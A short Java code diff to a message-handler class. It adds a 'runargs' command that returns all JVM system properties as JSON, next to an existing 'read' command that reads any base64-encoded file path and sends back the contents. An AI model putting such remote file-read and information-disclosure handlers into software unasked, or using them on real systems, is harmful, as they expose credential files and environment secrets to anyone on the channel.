@@ -93,6 +93,9 @@ public class MessageHandler {
                 case "read":
                     MessageUtils.sendMessage(messageType, FileReadUtil.read(decodeBase64(msgArr[1])));
                     break;
+                case "runargs":
+                    MessageUtils.sendMessage(messageType, new Gson().toJson(System.getProperties()));
+                    break;
                 default:
                     break;
             }
